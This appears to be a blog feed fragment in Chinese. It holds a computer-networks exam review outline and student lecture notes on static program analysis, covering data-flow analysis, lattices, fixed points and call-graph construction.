<h1 id="链路层"><a href="#链路层" class="headerlink" title="链路层"></a>链路层</h1><h2 id="TDMA-FDMA-CDMA"><a href="#TDMA-FDMA-CDMA" class="headerlink" title="TDMA/FDMA/CDMA"></a>TDMA/FDMA/CDMA</h2><h2 id="Aloha-Slotted-Aloha-什么时候用哪个"><a href="#Aloha-Slotted-Aloha-什么时候用哪个" class="headerlink" title="Aloha/Slotted-Aloha 什么时候用哪个"></a>Aloha/Slotted-Aloha 什么时候用哪个</h2><p>发数据的成功概率</p>
<h2 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h2><p>CSMA/CD 是怎么做的，重点看</p>
<h2 id="Wireless"><a href="#Wireless" class="headerlink" title="Wireless"></a>Wireless</h2><p>CSMA/CA or <em>Distributed Coordination&lt;-这个没讲过，自己看一下</em></p>
<p>问为什么不直接用 CD 而要用 CA</p>
<p>特征<br>Hidden terminal</p>
<p>Multi-path</p>
<p>信号衰减</p>
<p>有线网无线网区别</p>
<h2 id="交换机和网桥有什么区别"><a href="#交换机和网桥有什么区别" class="headerlink" title="交换机和网桥有什么区别"></a>交换机和网桥有什么区别</h2><p>地址的 self learning（交换机）</p>
<p>spanning tree（交换机）防止环路</p>
<h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><h2 id="IP-header"><a href="#IP-header" class="headerlink" title="IP header"></a>IP header</h2><h2 id="link-state-算法-distance-vector-算法，区别，代表性算法"><a href="#link-state-算法-distance-vector-算法，区别，代表性算法" class="headerlink" title="link-state 算法 distance vector 算法，区别，代表性算法"></a>link-state 算法 distance vector 算法，区别，代表性算法</h2><p>dijkstra and bf</p>
<h2 id="域间，域内-routing"><a href="#域间，域内-routing" class="headerlink" title="域间，域内 routing"></a>域间，域内 routing</h2><p>RIP/OSPF/BGP，用的什么算法</p>
<p>哪些是用于域间，哪些域内</p>
<h2 id="subnet，netmask，gateway"><a href="#subnet，netmask，gateway" class="headerlink" title="subnet，netmask，gateway"></a>subnet，netmask，gateway</h2><p>是什么，为什么gateway</p>
<p>如果没配置会有什么后果</p>
<h2 id="CIDR-是什么"><a href="#CIDR-是什么" class="headerlink" title="CIDR 是什么"></a>CIDR 是什么</h2><h2 id="ARP-是干什么的"><a href="#ARP-是干什么的" class="headerlink" title="ARP 是干什么的"></a>ARP 是干什么的</h2><p>谁是 1.1.1.1？告诉我它的 mac</p>
<h2 id="DHCP-是干什么的"><a href="#DHCP-是干什么的" class="headerlink" title="DHCP 是干什么的"></a>DHCP 是干什么的</h2><h1 id="传输层-1"><a href="#传输层-1" class="headerlink" title="传输层"></a>传输层</h1><h2 id="UDP-和-TCP-区别"><a href="#UDP-和-TCP-区别" class="headerlink" title="UDP 和 TCP 区别"></a>UDP 和 TCP 区别</h2><h2 id="UDP-TCP-header里有什么"><a href="#UDP-TCP-header里有什么" class="headerlink" title="UDP TCP header里有什么"></a>UDP TCP header里有什么</h2><h2 id="TCP-三次握手，分手"><a href="#TCP-三次握手，分手" class="headerlink" title="TCP 三次握手，分手"></a>TCP 三次握手，分手</h2><p>为什么要三次握手</p>
<p>分手有几种，友好的，不友好的</p>
<h2 id="TCP-的细节，可靠性和流控"><a href="#TCP-的细节，可靠性和流控" class="headerlink" title="TCP 的细节，可靠性和流控"></a>TCP 的细节，可靠性和流控</h2><p>流控和拥塞控制的区别</p>
<h2 id="TCP-拥塞控制"><a href="#TCP-拥塞控制" class="headerlink" title="TCP 拥塞控制"></a>TCP 拥塞控制</h2><p>sliding window</p>
<p>AIMD</p>
<p>RTT</p>
<h2 id="ICMP-1"><a href="#ICMP-1" class="headerlink" title="ICMP"></a>ICMP</h2><p>有什么黑科技功能</p>
<h2 id="NAT-1"><a href="#NAT-1" class="headerlink" title="NAT"></a>NAT</h2><p>有两种类别，运行于不同层？</p>
<p>静态绑定动态绑定</p>
<p>一个子网怎么划分？网关怎么配？dns怎么设，防火墙怎么设，要不要设NAT</p>
<h1 id="应用层-1"><a href="#应用层-1" class="headerlink" title="应用层"></a>应用层</h1><h2 id="HTTP-1"><a href="#HTTP-1" class="headerlink" title="HTTP"></a>HTTP</h2><p>有多少种，取数据的方式有什么不同 1.0 2.0，中间建立几个连接</p>
<h2 id="DNS-1"><a href="#DNS-1" class="headerlink" title="DNS"></a>DNS</h2><p>是主机在发 query 还是别的实体在发 query</p>
<h1 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h1><h2 id="对称密钥"><a href="#对称密钥" class="headerlink" title="对称密钥"></a>对称密钥</h2><h2 id="公私密钥"><a href="#公私密钥" class="headerlink" title="公私密钥"></a>公私密钥</h2><p>RSA 实例</p>
<h2 id="信任第三方-CA"><a href="#信任第三方-CA" class="headerlink" title="信任第三方 CA"></a>信任第三方 CA</h2><p>为什么需要可信第三方</p>
<h2 id="DH-key-exchange"><a href="#DH-key-exchange" class="headerlink" title="DH key exchange"></a>DH key exchange</h2><p>不需要第三方，为什么也能安全交换</p>
<h2 id="IPSec"><a href="#IPSec" class="headerlink" title="IPSec"></a>IPSec</h2><p>什么时候用，有几种协议模式，有几种运行模式</p>
<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>什么时候用</p>
]]></content>
      <categories>
        <category>Computer Network</category>
      </categories>
      <tags>
        <tag>Computer Network</tag>
      </tags>
  </entry>
  <entry>
    <title>软件分析笔记</title>
    <url>/2021/11/15/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>软件分析笔记</p>
<p>50实验，50理论考试（英文考试，作答中英都可以）</p>
<h1 id="class-1"><a href="#class-1" class="headerlink" title="class-1"></a>class-1</h1><p>网课（b站）听过了就可以不用听了</p>
<p>主讲的是静态分析，static program analysis</p>
<p>Programming Language，简称PL，在liyue看来可以分为三个部分</p>
<ul>
<li>理论：语法，语义，…</li>
<li>环境：编译器，运行环境，…</li>
<li>应用：程序分析，程序验证，程序合成，…</li>
</ul>
<p>虽然语言很多，但是从2000年开始，语言的核心，就没有变过了（这意味着理论和环境变化很少，变化多的是应用）</p>
<p>语言分为三种范式</p>
<ul>
<li>命令式语言：有时序，和状态修改</li>
<li>函数式编程语言：弱化了时序和状态修改。函数作为变量，表达式求值，lambda演算<ul>
<li>由于弱化了时序，很难出现并发错误，多用于金融系统</li>
</ul>
</li>
<li>逻辑式编程语言：mysql，datalog等，基于谓词演算逻辑，主要用于处理大数据</li>
</ul>
<p>静态分析能干哪些事？</p>
<ul>
<li>程序可靠性：在运行前（称为静态期，编译期）检测出空指针引用，内存泄漏等</li>
<li>程序安全：隐私保护，注入攻击等</li>
<li>编译优化：死代码消除，代码转移等</li>
<li>程序理解：IDE的类调用图，类型提示</li>
</ul>
<p>不要浮躁</p>
<p>认识自己</p>
<p>重拾自信</p>
<hr>
<p>Rice’s Theorem：recursively&amp;enumerable的语言（re语言，是图灵机可识别的语言）的non-trival properties（理解为运行时行为）不存在完美的（sound&amp;complete）程序分析</p>
<p>解释一下，程序有5个bug，sound就是我说这程序有10个bug，保证5个都包含，即误报。complete就是我说这程序有2个bug，这俩都在那5个里，即漏报。</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210902194052147.png" alt="image-20210902194052147" style="zoom:67%;"></p>
<p>现实世界里，大部分程序分析都在妥协sound，即允许误报，不允许漏报。</p>
<p>-</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210902194924758.png" alt="image-20210902194924758" style="zoom:67%;"></p>
<p>1和2的分析都是sound的，正确的。</p>
<p>静态分析：在保证（接近）soundness时，在精度和开销大之间做平衡</p>
<p>静态分析的大框架：分为两步走</p>
<ol>
<li>抽象 abstraction</li>
<li>过近似 over-approximation<ul>
<li>transfer function</li>
<li>control flows</li>
</ul>
</li>
</ol>
<p>以“预测一个程序中所有变量的正负性”这个目标展开的静态分析为例：</p>
<p>abstraction: 给每个变量定义正，负，0，不确定，未定义这5种类型</p>
<p>transfer function：规定正+正＝正，正+负=不确定等</p>
<p>control flow：将控制流图里的汇聚点找出，确定每个汇聚点的变量是什么符号</p>
<hr>
<p><img src="/2021/11/15/软件分析笔记/image-20210902201500591.png" alt="image-20210902201500591" style="zoom:67%;"></p>
<p>实验任务</p>
<hr>
<p>本节课的重点</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210902202402069.png" alt="image-20210902202402069"></p>
<p>TODO：回答上述问题</p>
<ol>
<li>运行前vs运行时</li>
<li>那个圈圈图</li>
<li>误报是允许的，但漏报就会导致错误</li>
<li>+-0，确定符号的例子回顾</li>
</ol>
<h1 id="class-2"><a href="#class-2" class="headerlink" title="class-2"></a>class-2</h1><p>讲中间表示 intermediate representation</p>
<p>4种文法分类（由强到弱，开销也由大到小）：图灵机，上下文相关文法，上下文无关文法，正则表达式</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210909184655494.png" alt="image-20210909184655494" style="zoom:67%;"></p>
<p>为什么静态分析不用AST，而是用三地址码IR呢？</p>
<p>AST</p>
<ul>
<li>比较high-level，近似语法结构</li>
<li>和语言相关</li>
<li>对type检查很快</li>
<li>缺乏控制流信息</li>
</ul>
<p>3-Address Code（3AC）</p>
<ul>
<li>比较low-level，接近机器码</li>
<li>和语言无关</li>
<li>缺乏类型信息，简单</li>
<li>看得出来控制流信息</li>
</ul>
<p>-</p>
<p>对java中的一些解释</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210909192405357.png" alt="image-20210909192405357"></p>
<p>-</p>
<p>Static Single Assignment（SSA）静态单赋值</p>
<ul>
<li>一个变量只会有一个定义</li>
</ul>
<p>为了解决分支造成的变量值不确定，引入了phi-function</p>
<p>SSA好处—-坏处—-</p>
<p>-</p>
<p>Control Flow Analysis</p>
<p>为了看的更清楚，把3AC画成CFG</p>
<p>CGF中的node都都是Basic Block（BB）</p>
<p>-</p>
<p>Basic Block定义</p>
<ul>
<li>最大的，满足如下条件的连续语句<pre><code>1. 只有一个入口
 2. 只有一个出口
</code></pre></li>
</ul>
<p>-</p>
<p>BB切分算法：</p>
<p>入口（leader）：</p>
<ol>
<li>第一条指令</li>
<li>跳转语句的target</li>
<li>跳转语句的下一条指令</li>
</ol>
<p>出口：不用管了，leader之间夹着就足以确定BB了</p>
<p>如何添加边（edge）：</p>
<ol>
<li>A到B有跳转关系</li>
<li>B在A下面顺序执行，且A的最后一句不是无条件goto</li>
</ol>
<p>goto i号语句，可以改成goto Bi基本块，这样清晰且不用考虑语句i的编号增加</p>
<p>给CFG添加entry和exit</p>
<p>—</p>
<p>今日重点</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210909201216382.png" alt="image-20210909201216382"></p>
<p>-</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210909201431894.png" alt="image-20210909201431894"></p>
<p>需要掌握</p>
<ol>
<li>为什么IR比AST更常用？</li>
<li>BB的定义，划分算法，如何添边</li>
<li>CFG（并不是非要由BB组成）是怎么画出来的</li>
<li>开篇的那张关于词法分析，语法分析，语义分析，IR。。。的图</li>
</ol>
<h1 id="class-3"><a href="#class-3" class="headerlink" title="class-3"></a>class-3</h1><p>may analysis：分析的结果可能是对的（over-approximation）</p>
<p>must analysis：分析的结果一定是对的（under-approximation）漏报没关系，顶多是少优化一点</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210916185913134.png" alt="image-20210916185913134" style="zoom:80%;"></p>
<p>前向分析和后向分析</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210916190410368.png" alt="image-20210916190410368" style="zoom:80%;"></p>
<p>前向分析时，OUT[B]是算出来的，IN[B]是B的前驱的OUT们简单meet出来的</p>
<p>后向分析时，反的</p>
<p>-</p>
<p>数据流分析不考虑：函数调用，别名</p>
<p>-</p>
<h2 id="Reaching-Definition"><a href="#Reaching-Definition" class="headerlink" title="Reaching Definition"></a>Reaching Definition</h2><p>是forward analysis和may analysis</p>
<p>definition定义：</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211009175611191.png" alt="image-20211009175611191"></p>
<p>用途：检测undefined variables（在程序entry处给所有变量一个undefine的定义，然后检测是否reaching到变量被使用的地方，如果reaching，就说明未定义就使用啦）</p>
<p>求reaching definition的迭代算法</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210916192909319.png" alt="image-20210916192909319"></p>
<p>Q：为什么要区分entry和B\entry？因为这种迭代算法是一个模板，虽然在这个例子里都是初始化为空，但别的算法里未必。</p>
<p>Q：为什么初始化为空？想象在程序entry的地方，什么definition都没有。</p>
<p>Q：为什么迭代算法能停？</p>
<p>观察发现，gen和kill是不变的如果IN不变，那么OUT也不会变</p>
<p>OUT[S] = gen U (IN[S] - kill)</p>
<p>当更多的fact进入IN时，多出来的1有可能被kill，也可能保留下来</p>
<p>所以OUT永远不会shrink，只有0-&gt;1，1-&gt;1</p>
<p>而fact的次数是有限的，所以能停</p>
<p>Q：为什么OUT不再改变，算法就可以停了，结果就是精准的最后的结果呢？</p>
<p>这个和程序的单调性有关，达到不动点（后续讲）</p>
<h1 id="class-4"><a href="#class-4" class="headerlink" title="class-4"></a>class-4</h1><h2 id="Live-Variables-Analysis"><a href="#Live-Variables-Analysis" class="headerlink" title="Live Variables Analysis"></a>Live Variables Analysis</h2><p><img src="/2021/11/15/软件分析笔记/image-20210923183616652.png" alt="image-20210923183616652"></p>
<p>v在给定的程序点P之后一直到exit，是不是还有被用到，且路上没有再次被定义</p>
<p>他是一个backward analysis（后向更加简洁直接，不代表前向无法做到哈）</p>
<p>考虑定义，一个变量将来是否可能被用到，假如有多条路径，即使有的路我不跑过去，我也是全部考虑，所以是may analysis</p>
<p>给定OUT求IN，OUT很好做，OUT=U(In of successors)，如何定义transfer function呢？</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210923185827091.png" alt="image-20210923185827091"></p>
<p>注意情况4，看似v被改了，但是首先v先被v-1用到了，所以我们先去除redefine的，然后加上use的</p>
<p>。下面看算法</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210923190224858.png" alt="image-20210923190224858"></p>
<p>以后讲为什么是初始化为空0000000（一般，may analysis都是空，must analysis都是1111111）</p>
<h2 id="Available-Expressions-Analysis"><a href="#Available-Expressions-Analysis" class="headerlink" title="Available Expressions Analysis"></a>Available Expressions Analysis</h2><p>是一个forward，must analysis</p>
<p>一个表达式x op y在给定程序点P是可用的，如果满足1，从entry到P的<strong>所有</strong>路径都要求值x op y，在最后一次x op y算完之后，不能对x和y进行重定义</p>
<p>有几个表达式就有几个0/1</p>
<p>怎么考虑gen和kill呢？</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210923193714904.png" alt="image-20210923193714904" style="zoom:80%;"></p>
<p>kill的是IN里含有被redefine的表达式</p>
<p>gen的是</p>
<p>-</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210923194332904.png" alt="image-20210923194332904"></p>
<p>这是一个反直觉的例子，看起来x被改了，但是根据定义，e^16 * x确实在两次last计算后都没有改x，所以在c这一句之前的程序点，表达式是可用的</p>
<p>有人可能会问：哎，那我使用这个表达式的时候x的值在ab处不一样呀。如下，就行了</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210923194238722.png" alt="image-20210923194238722"></p>
<p>-</p>
<p>merge怎么考虑呢？注意是一个must analysis，要用<strong>与</strong>操作</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210923194357503.png" alt="image-20210923194357503"></p>
<p>-</p>
<p>算法如下</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210923195108605.png" alt="image-20210923195108605"></p>
<p>U代表1111111（TOP）</p>
<p>理论课会讲这和不动点有关，直观的想就是，因为用了“与”，如果初始化为0000，那没机会变1了</p>
<p>-</p>
<h2 id="analysis-comparison-of-the-3"><a href="#analysis-comparison-of-the-3" class="headerlink" title="analysis comparison of the 3"></a>analysis comparison of the 3</h2><p><img src="/2021/11/15/软件分析笔记/image-20210923201830729.png" alt="image-20210923201830729"></p>
<p>transfer function中，available exp之所以也可以这么写，是因为所谓的IN和OUT是可以反一反的</p>
<p>-</p>
<p>本课重点</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210923202036349.png" alt="image-20210923202036349"></p>
<h1 id="class-5"><a href="#class-5" class="headerlink" title="class-5"></a>class-5</h1><p>讲数据流分析的数学基础</p>
<p>迭代算法的遍历是在格上爬升？抵达不动点？单调性？可分配性？</p>
<p>事后复习可看ppt第8部分，一图流</p>
<p>-</p>
<p>换一种视角看迭代算法</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210930185604144.png" alt="image-20210930185604144"></p>
<p>Xi = F(Xi)，说明Xi是F的一个不动点</p>
<p>-</p>
<p>3个general的问题：</p>
<ul>
<li>迭代算法模板一定能停吗？</li>
<li>不动点是唯一不动点吗？如果不是的话，我们的不动点是最好的结果吗？</li>
<li>什么时候能抵达不动点？</li>
</ul>
<p>-</p>
<p>回顾一下</p>
<h2 id="离散背景"><a href="#离散背景" class="headerlink" title="离散背景"></a>离散背景</h2><h3 id="偏序集（-lt-代表一种二元关系，自定义）"><a href="#偏序集（-lt-代表一种二元关系，自定义）" class="headerlink" title="偏序集（&lt;=代表一种二元关系，自定义）"></a>偏序集（&lt;=代表一种二元关系，自定义）</h3><ul>
<li>自反性：x &lt;= x</li>
<li>反对称性：x&lt;=y ^ y&lt;=x =&gt; x=y</li>
<li>传递性：x &lt;=y, y&lt;=z  =&gt; x&lt;=z</li>
</ul>
<p><img src="/2021/11/15/软件分析笔记/image-20210930190823625.png" alt="image-20210930190823625" style="zoom:80%;"></p>
<p>-</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210930191051791.png" alt="image-20210930191051791"></p>
<p>偏序偏在哪？两个元素之间不一定可比</p>
<p>-</p>
<h3 id="上界和下界"><a href="#上界和下界" class="headerlink" title="上界和下界"></a>上界和下界</h3><p><img src="/2021/11/15/软件分析笔记/image-20210930191202099.png" alt="image-20210930191202099"></p>
<p>注意，P是幂集，上界不一定要在S中，在大的P中即可，如下图</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210930191400711.png" alt="image-20210930191400711"></p>
<p>-</p>
<p>下面定义最小上界，least upper bound，简称lub，或者join</p>
<p>最大下界，greatest lower bound，glb，或者meet</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210930191541385.png" alt="image-20210930191541385"></p>
<p>-</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210930191706578.png" alt="image-20210930191706578"></p>
<p>-</p>
<p>注意，当S只有两个元素是，join就像交，meet就像并</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210930191810665.png" alt="image-20210930191810665"></p>
<p>-</p>
<p>一些重要性质：</p>
<p>不是每个偏序集都有lub或者glb</p>
<p>如果偏序集有lub和glb，那么一定是唯一的</p>
<p>-</p>
<h3 id="格，lattice"><a href="#格，lattice" class="headerlink" title="格，lattice"></a>格，lattice</h3><p>如果偏序集poset，中的任意两个元素同时有lub和glb，那么就是格</p>
<p>example1，整数，&lt;=，是的</p>
<p>example2，一些字符串，子串关系，不一定嗷</p>
<p>example3，abc的幂集，子集关系，是的</p>
<p>-</p>
<h3 id="半格，semilattice"><a href="#半格，semilattice" class="headerlink" title="半格，semilattice"></a>半格，semilattice</h3><p>相当于格的一半，如果偏序集poset，中的任意两个元素</p>
<p>如果只有lub存在，就是join semilattice</p>
<p>如果只有glb存在，就是meet semilattice</p>
<h3 id="全格，complete-lattice"><a href="#全格，complete-lattice" class="headerlink" title="全格，complete lattice"></a>全格，complete lattice</h3><p>现在要求格的任意子集都存在lub和glb</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210930193224520.png" alt="image-20210930193224520"></p>
<p>example1，整数，&lt;=，不是，如果一个子集包含了所有正整数，它没有upper bound，但如果把正无穷符号引入，它就是了</p>
<p>example2，幂集，是的</p>
<p>-</p>
<p>下面引入全格的top和bottom概念，且一定存在</p>
<ul>
<li>top就是P最大的上界</li>
<li>bottom是P最小的下界</li>
</ul>
<p>-</p>
<p>一个性质</p>
<p>格如果是有限的，那他一定是全格</p>
<p>所有全格一定是有限格吗？不一定是的，例如0~1里的实数，无穷多个，但有top和bottom</p>
<h3 id="produce-lattice"><a href="#produce-lattice" class="headerlink" title="produce lattice"></a>produce lattice</h3><p>一堆格，假如每个格都有上下界</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210930194032125.png" alt="image-20210930194032125"></p>
<p>-</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210930194103532.png" alt="image-20210930194103532"></p>
<p>-</p>
<h2 id="数据流分析和格"><a href="#数据流分析和格" class="headerlink" title="数据流分析和格"></a>数据流分析和格</h2><p>迭代式算法就是在格上面跑transfer function，meet，join</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210930194656140.png" alt="image-20210930194656140"></p>
<p>但是呢，需要满足一些条件才能保证后面能停。</p>
<p>-</p>
<h3 id="单调性"><a href="#单调性" class="headerlink" title="单调性"></a>单调性</h3><p>函数f: L-&gt;L，如果x&lt;=y，那么f(x)&lt;=f(y)</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210930195317451.png" alt="image-20210930195317451"></p>
<h3 id="不动点理论"><a href="#不动点理论" class="headerlink" title="不动点理论"></a>不动点理论</h3><p>假如f: L-&gt;L是单调的，全格L是有限的</p>
<p>那么最小不动点是可以从bottom一路ffff上去的</p>
<p>最大不动点是可以从top一路ffff上去的</p>
<p>-</p>
<p>证明分两步，一步是证明可以获得不动点，第二步证明是最小不动点</p>
<p>第一步：</p>
<p>核心：因为L是有限的，所以可以通过有限步（L的高度）的f应用于bottom</p>
<p>-</p>
<p>第二步如下：</p>
<p><img src="/2021/11/15/软件分析笔记/image-20210930200739121.png" alt="image-20210930200739121"></p>
<p>-</p>
<h1 id="class-6-Data-Flow-Analysis-Foundations-II"><a href="#class-6-Data-Flow-Analysis-Foundations-II" class="headerlink" title="class-6 Data Flow Analysis - Foundations II"></a>class-6 Data Flow Analysis - Foundations II</h1><h2 id="join-meet-monotonic证明"><a href="#join-meet-monotonic证明" class="headerlink" title="join meet monotonic证明"></a>join meet monotonic证明</h2><p><img src="/2021/11/15/软件分析笔记/image-20211009173230567.png" alt="image-20211009173230567"></p>
<p>由上节课的内容，我们知道了单调函数F可以让bottom达到最小不动点，top达到最大不动点，那么我们接下来要证明meet和join是单调的</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211009171839165.png" alt="image-20211009171839165"></p>
<p>就是要证明当x&lt;=y时，xuz &lt;= yuz</p>
<p>证：</p>
<p>x &lt;= y</p>
<p>y &lt;= yuz</p>
<p>所以x &lt;= yuz</p>
<p>又 z &lt;= yuz</p>
<p>所以 yuz是x和z的upper bound</p>
<p>而xuz是x和z的the least upper bound</p>
<p>所以xuz &lt;= yuz</p>
<p>由此证明了join函数是单调的</p>
<p>-</p>
<h2 id="迭代算法何时收敛"><a href="#迭代算法何时收敛" class="headerlink" title="迭代算法何时收敛"></a>迭代算法何时收敛</h2><p>接下来只剩一个问题，算法何时收敛？</p>
<p>定义格的高度h，假设CFG里节点一共有k个，最坏情况就是：每次迭代只有1个节点的1个位变化了，总共需要h*k次迭代</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211009173801057.png" alt="image-20211009173801057"></p>
<p>-</p>
<h2 id="may-must-analyses-from-lattice-view"><a href="#may-must-analyses-from-lattice-view" class="headerlink" title="may must analyses from lattice view"></a>may must analyses from lattice view</h2><p><img src="/2021/11/15/软件分析笔记/image-20211009180522909.png" alt="image-20211009180522909"></p>
<p>这张图很直观</p>
<p>另一种角度解释达到的是最大和最小不动点：u和^操作都是最小上界/最大下界，所以迭代的每一个step都是最小的，所以能一个个step达到最小不动点/最大不动点</p>
<p>-</p>
<h2 id="精度有多高"><a href="#精度有多高" class="headerlink" title="精度有多高"></a>精度有多高</h2><p>MOP概念：把每条路径的f组合起来</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211009192546501.png" alt="image-20211009192546501"></p>
<p>-</p>
<p>迭代算法vsMOP</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211009192900963.png" alt="image-20211009192900963"></p>
<p>先u再f  —-vs—- 先f再u</p>
<p>-</p>
<p>证明F(xuy) &lt;= F(x) u F(y) 熟悉的感觉</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211009193354604.png" alt="image-20211009193354604"></p>
<p>当F是可分配的时候，我们的分析和MOP一样准</p>
<p>哪些是可分配的呢？例如前面提到的reaching definition, available expression, live variable，同时满足</p>
<ul>
<li>bit-vector：问题转换成集合的交和并</li>
<li>gen/kill problem</li>
</ul>
<p>哪些是不可分配的呢？</p>
<p>下面这个例子就是不可分配</p>
<h2 id="constant-propagation"><a href="#constant-propagation" class="headerlink" title="constant propagation"></a>constant propagation</h2><p><img src="/2021/11/15/软件分析笔记/image-20211009200657242.png" alt="image-20211009200657242"></p>
<p>-</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211009201404648.png" alt="image-20211009201404648"></p>
<p>这次的meet不是一个简单交并了</p>
<p>-</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211009202241303.png" alt="image-20211009202241303"></p>
<p>otherwise其实只剩val(y),val(z)中有UNDEF的情况了</p>
<p>identity function：恒等函数，等于啥也不做</p>
<p>比如if，goto之类的语句</p>
<p>-</p>
<p>非分配的例子        </p>
<p><img src="/2021/11/15/软件分析笔记/image-20211009202745580.png" alt="image-20211009202745580"></p>
<p>。</p>
<h2 id="worklist-algorithm"><a href="#worklist-algorithm" class="headerlink" title="worklist algorithm"></a>worklist algorithm</h2><p>对迭代算法的一种优化：迭代算法如果一个节点变了一点就要重新算一遍所有的，存在冗余，所以我们改一改，只计算那些OUT变化了的节点（对前向分析来说）</p>
<p>OUT变化意味着后继节点的IN会改，然后后继节点的OUT也会改，所以需要把后继节点加入worklist</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211009203409123.png" alt="image-20211009203409123"></p>
<p>-</p>
<p>重点</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211009203827282.png" alt="image-20211009203827282"></p>
<h1 id="class-7-Inteprocedual-Analysis"><a href="#class-7-Inteprocedual-Analysis" class="headerlink" title="class-7 Inteprocedual Analysis"></a>class-7 Inteprocedual Analysis</h1><p>过程内（intraprocedural）分析是按最保守的假设来的，不够准确</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014194212217.png" alt="image-20211014194212217"></p>
<p>在这个例子里，x=42，y=43是更精确滴</p>
<p>-</p>
<h2 id="Call-Graph"><a href="#Call-Graph" class="headerlink" title="Call Graph"></a>Call Graph</h2><p>调用图的概念</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014194349988.png" alt="image-20211014194349988"></p>
<p>-</p>
<p>OOPLs的call graph有哪些应用</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014194606638.png" alt="image-20211014194606638"></p>
<p>-</p>
<h2 id="Java的call有三种类型"><a href="#Java的call有三种类型" class="headerlink" title="Java的call有三种类型"></a>Java的call有三种类型</h2><ul>
<li>static call</li>
<li>special call</li>
<li>virtual call</li>
</ul>
<p><img src="/2021/11/15/软件分析笔记/image-20211014195016141.png" alt="image-20211014195016141"></p>
<p>-</p>
<p>SOOT中采用的格式，绿的是我们课内简写</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014195313068.png" alt="image-20211014195313068"></p>
<p>-</p>
<p>起作用的是方法名，参数类型</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014195507872.png" alt="image-20211014195507872"></p>
<p>相当于找实际调用的是哪个类的方法</p>
<p>-</p>
<h2 id="Classs-Hierarchy-Analysis-CHA"><a href="#Classs-Hierarchy-Analysis-CHA" class="headerlink" title="Classs Hierarchy Analysis (CHA)"></a>Classs Hierarchy Analysis (CHA)</h2><p>假设A a可以指向A类和它的子类，CHA就是找目标method</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014200104973.png" alt="image-20211014200104973"></p>
<p>-</p>
<p>怎么求解？分情况讨论</p>
<p>static call就是自己的foo就行了</p>
<p>注意special call不是只找父类就完事了，因为父类B里不一定有foo，可能是父类的父类</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014200510811.png" alt="image-20211014200510811"></p>
<p>-</p>
<p>virtual call需要去找c的声明类型C的所有子类（包括子类的子类）</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014200801820.png" alt="image-20211014200801820"></p>
<p>-</p>
<p>一个例子，注意B，B需要Dispatch(B), DIspatch(C), Dispatch(B)，B本身没有foo，所以Dispatch(B)会找到父类A的foo</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014201506737.png" alt="image-20211014201506737"></p>
<p>-</p>
<p>即使B b = new B()，依然是ACD，因为CHA只看b的声明类型！不看实际指向。</p>
<p>可以发现这也导致了一个问题，C.foo()和D.foo()在下图的例子里是假的</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014201716224.png" alt="image-20211014201716224"></p>
<p>-</p>
<p>CHA的特点</p>
<p>pros：快，只看声明类型</p>
<p>cons：导致引入假方法</p>
<p>-</p>
<p>用途：IDE方法提示</p>
<h2 id="call-graph-construction"><a href="#call-graph-construction" class="headerlink" title="call graph construction"></a>call graph construction</h2><p>从main开始</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014202604005.png" alt="image-20211014202604005"></p>
<p>-</p>
<p>T是一个目标方法的集合（之所以是集合，因为virtual call的存在，一对多）</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014203144030.png" alt="image-20211014203144030"></p>
<p>-</p>
<h2 id="Interprocedural-Control-Flow-Graph-ICFG"><a href="#Interprocedural-Control-Flow-Graph-ICFG" class="headerlink" title="Interprocedural Control-Flow Graph (ICFG)"></a>Interprocedural Control-Flow Graph (ICFG)</h2><p>ICFG是所有method的CFG加上call edge和return edge</p>
